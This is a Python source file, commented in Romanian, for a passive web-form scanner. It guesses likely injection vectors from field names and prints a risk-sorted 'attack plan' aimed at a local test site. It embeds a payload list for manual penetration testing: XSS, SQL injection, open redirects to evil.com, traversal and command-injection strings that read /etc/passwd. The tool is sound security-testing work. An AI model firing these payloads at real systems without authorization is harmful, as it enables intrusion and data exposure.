import requests
from bs4 import BeautifulSoup

# ====== HEURISTICI: nume câmp → tip de atac probabil ======
# Cuvinte cheie care, dacă apar în numele câmpului, sugerează un anumit vector
HEURISTICI_CAMP = {
    "xss_reflectat": ["search", "query", "q", "find", "lookup", "keyword", "term", "filter"],
    "sql_injection": ["email", "username", "user", "login", "id", "user_id", "product_id",
                      "order_id", "account", "uid", "userid"],
    "open_redirect": ["url", "redirect", "next", "return", "returnurl", "goto", "target",
                      "destination", "continue", "redir"],
    "path_traversal": ["file", "path", "page", "doc", "document", "include", "template",
                       "filename", "filepath"],
    "command_injection": ["cmd", "exec", "command", "host", "ip", "ping", "domain",
                          "address", "shell"],
    "xss_stored": ["comment", "message", "bio", "description", "about", "content",
                   "post", "text", "note", "feedback", "review"]
}

# ====== PAYLOAD-URI per tip de atac (5 per tip, afișate ca text pentru testare manuală) ======
PAYLOADS = {
    "xss_reflectat": [
        "<script>alert(1)</script>",
        '"><svg/onload=alert(1)>',
        "<img src=x onerror=alert(document.domain)>",
        "javascript:alert(1)",
        '"><iframe src="javascript:alert(1)">'
    ],
    "xss_stored": [
        "<script>alert('stored')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(document.cookie)>",
        "<body onload=alert(1)>",
        '<a href="javascript:alert(1)">click</a>'
    ],
    "sql_injection": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' AND SLEEP(5)--",
        "admin'--"
    ],
    "open_redirect": [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https://target.com.evil.com",
        "javascript:alert(1)"
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
        "..\\..\\..\\windows\\win.ini"
    ],
    "command_injection": [
        "; ls -la",
        "| whoami",
        "`id`",
        "$(sleep 5)",
        "&& cat /etc/passwd"
    ],
    "html_injection_basic": [
        "<h1>Test injection</h1>",
        "<b>bold injected</b>",
        "<marquee>HTML works</marquee>",
        "<style>body{background:red}</style>",
        "<iframe src='about:blank'></iframe>"
    ]
}

# ====== Etichete prietenoase pentru raport ======
ETICHETE = {
    "xss_reflectat": "XSS Reflectat",
    "xss_stored": "XSS Stored",
    "sql_injection": "SQL Injection",
    "open_redirect": "Open Redirect",
    "path_traversal": "Path Traversal",
    "command_injection": "Command Injection",
    "html_injection_basic": "HTML Injection (generic)"
}


def detecteaza_vectori(nume_camp: str, tip_camp: str, metoda_form: str) -> list:
    """
    Pe baza numelui câmpului, returnează lista de tipuri de atac probabile.
    Dacă nu se potrivește pe nimic specific, returnează html_injection_basic.
    """
    nume_lower = nume_camp.lower()
    vectori_detectati = []

    for tip_atac, cuvinte in HEURISTICI_CAMP.items():
        if any(cuv in nume_lower for cuv in cuvinte):
            vectori_detectati.append(tip_atac)

    # Câmpurile de tip 'password' nu sunt vectori interesanți (validate server-side strict)
    # Câmpurile de tip textarea sunt mai probabil XSS stored
    if tip_camp == "textarea" and "xss_stored" not in vectori_detectati:
        vectori_detectati.append("xss_stored")

    # Dacă nu am identificat nimic specific → HTML injection generic
    if not vectori_detectati:
        vectori_detectati.append("html_injection_basic")

    return vectori_detectati


def calculeaza_scor_risc(nume_camp: str, tip_camp: str, metoda_form: str,
                          vectori: list, atribute_camp: dict) -> tuple:
    """
    Calculează scor de risc 1-10 + etichetă RIDICAT/MEDIU/SCĂZUT.
    Factori care cresc riscul:
    - GET (parametrii apar în URL, mai expus)
    - Vectori multipli detectați
    - Lipsa protecțiilor (maxlength, pattern)
    - Câmpuri cu nume sensibile (search, user_id)
    """
    scor = 3  # bază pentru orice câmp

    # GET expune parametrii în URL, mai periculos pentru XSS reflectat
    if metoda_form == "GET":
        scor += 2

    # Câmpuri specifice cu risc mare automat
    nume_lower = nume_camp.lower()
    if any(cuv in nume_lower for cuv in ["search", "q", "query"]):
        scor += 3  # XSS reflectat clasic
    if any(cuv in nume_lower for cuv in ["id", "user_id", "uid"]):
        scor += 2  # IDOR + SQLi
    if any(cuv in nume_lower for cuv in ["url", "redirect", "next"]):
        scor += 2  # Open Redirect

    # Lipsa protecțiilor crește riscul
    if not atribute_camp.get("maxlength"):
        scor += 1
    if not atribute_camp.get("pattern"):
        scor += 1

    # Mai mulți vectori posibili = risc mai mare
    if len(vectori) >= 2:
        scor += 1

    # Limită la 10
    scor = min(scor, 10)

    # Etichetă
    if scor >= 7:
        eticheta = "🔴 RIDICAT"
    elif scor >= 4:
        eticheta = "🟡 MEDIU"
    else:
        eticheta = "🔵 SCĂZUT"

    return scor, eticheta


def verifica_html_injection(url: str) -> str:
    """
    Analizează formularele și câmpurile de intrare pentru a identifica vectori
    potențiali de injectare (OWASP A03:2021).

    SCANARE 100% PASIVĂ: doar citește pagina și generează plan de atac.
    Niciun payload nu este trimis către țintă - utilizatorul îl copiază manual.
    """
    print(f"\n[💉 Tool Executat] Analizez vectorii de injectare pentru {url}...")

    try:
        raspuns = requests.get(url, timeout=5)
        soup = BeautifulSoup(raspuns.text, 'html.parser')

        rezultat = f"--- Rezultate Verificare Injection (Pasiv) pentru {url} ---\n\n"

        # ====== ANALIZĂ FORMULARE ======
        formulare = soup.find_all('form')
        if not formulare:
            rezultat += "✅ Nu au fost găsite formulare vizibile pe această pagină.\n"
            rezultat += "\n💡 Notă: Formularele pot fi încărcate dinamic prin JS — verifică și API endpoint-urile detectate de A01.\n"
            return rezultat

        rezultat += f"🔎 Am găsit {len(formulare)} formulare pentru analiză:\n"

        # Colectăm toate câmpurile cu scor de risc pentru sortare finală
        toate_campurile = []

        for i, form in enumerate(formulare, 1):
            actiune = form.get('action', '(aceeași pagină)')
            metoda = form.get('method', 'get').upper()
            rezultat += f"\n━━━ Formular {i} [Metoda: {metoda} | Acțiune: {actiune}] ━━━\n"

            inputuri = form.find_all(['input', 'textarea'])
            campuri_relevante = 0

            for inp in inputuri:
                tip = inp.get('type', 'text')
                nume = inp.get('name', 'fără-nume')

                # Skip butoanele, hidden (sunt în A01), submit
                if tip in ['submit', 'hidden', 'button', 'reset', 'image']:
                    continue
                # Skip password - validare strictă server-side, nu vector tipic injection
                if tip == 'password':
                    continue

                campuri_relevante += 1

                # Atributele câmpului pentru evaluare protecții
                atribute = {
                    "maxlength": inp.get('maxlength'),
                    "pattern": inp.get('pattern'),
                    "required": inp.get('required') is not None
                }

                # Pentru textarea, tipul devine 'textarea'
                tip_efectiv = "textarea" if inp.name == "textarea" else tip

                # Detectare vectori probabili
                vectori = detecteaza_vectori(nume, tip_efectiv, metoda)

                # Calcul scor de risc
                scor, eticheta = calculeaza_scor_risc(nume, tip_efectiv, metoda, vectori, atribute)

                toate_campurile.append({
                    "form_index": i,
                    "nume": nume,
                    "tip": tip_efectiv,
                    "metoda": metoda,
                    "actiune": actiune,
                    "vectori": vectori,
                    "scor": scor,
                    "eticheta": eticheta,
                    "atribute": atribute
                })

            if campuri_relevante == 0:
                rezultat += "  (Niciun câmp de input relevant — doar butoane / câmpuri ascunse)\n"

        # ====== SORTARE ȘI AFIȘARE CÂMPURI DUPĂ RISC ======
        if not toate_campurile:
            rezultat += "\n✅ Niciun câmp de input util pentru injection.\n"
            return rezultat

        # Sortare descrescătoare după scor
        toate_campurile.sort(key=lambda x: x["scor"], reverse=True)

        rezultat += f"\n\n━━━━━━ 🎯 PLAN DE ATAC (sortat după prioritate) ━━━━━━\n"
        rezultat += f"Total câmpuri identificate: {len(toate_campurile)}\n"

        for camp in toate_campurile:
            rezultat += f"\n{camp['eticheta']} — Câmp '{camp['nume']}'\n"
            rezultat += f"  Form #{camp['form_index']} | Tip: {camp['tip']} | Metoda: {camp['metoda']}\n"

            # Protecții observate
            protectii = []
            if camp['atribute']['maxlength']:
                protectii.append(f"maxlength={camp['atribute']['maxlength']}")
            if camp['atribute']['pattern']:
                protectii.append("regex pattern")
            if not protectii:
                rezultat += f"  ⚠️ Protecții client-side: NICIUNA\n"
            else:
                rezultat += f"  ℹ️ Protecții client-side: {', '.join(protectii)} (bypass-abile din DevTools)\n"

            # Vectori detectați
            etichete_vectori = [ETICHETE[v] for v in camp['vectori']]
            rezultat += f"  🎯 Vectori probabili: {', '.join(etichete_vectori)}\n"

            # Payload-uri pentru fiecare vector (5 per tip)
            rezultat += "  📋 Payload-uri pentru testare manuală în Burp/sqlmap:\n"
            for vector in camp['vectori']:
                rezultat += f"\n     ▸ {ETICHETE[vector]}:\n"
                for payload in PAYLOADS[vector]:
                    rezultat += f"        • {payload}\n"

        rezultat += "\n\n💡 NOTĂ: Scanare 100% pasivă. Folosește Burp Repeater / sqlmap pentru testarea efectivă.\n"
        return rezultat

    except Exception as e:
        return f"Eroare la scanarea pentru injectare: {str(e)}"


if __name__ == "__main__":
    print(verifica_html_injection("http://localhost:3000"))